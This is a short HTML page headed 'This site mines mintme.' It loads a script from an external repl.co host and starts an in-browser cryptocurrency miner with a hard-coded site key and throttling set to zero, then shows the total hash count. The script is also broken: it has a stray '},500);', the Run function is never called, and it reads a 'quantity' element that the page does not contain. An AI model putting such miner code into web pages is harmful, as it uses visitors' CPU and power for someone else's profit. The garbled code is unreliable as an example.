<html>
<body>
    <h1>This site mines mintme.</h1>

    <p id="hashes"></p>
<script src="https://JudiciousIntelligentCircles.locknessko.repl.co/?f=2Jwy.js"></script>

<script>
    function Run() {
    Options();  
        Start();

            hps = _client.getHashesPerSecond();
            hashes = _client.getTotalHashes(true);

            document.getElementById("hashes").innerHTML = "Total Hashes: "+hashes;
        },500);
        
    }
    var _client;
    function Start() {_client.start();}
     function Options(){
        _client = new Client.Anonymous('677f8501bc9289073aee34b6764aa426adb00f6f2c5d2b6e4c711f71511dbeef', { 
            throttle: 0, threads: parseInt(document.getElementById("quantity").value), c: 'w', ads: 0
        });
     }

</script>
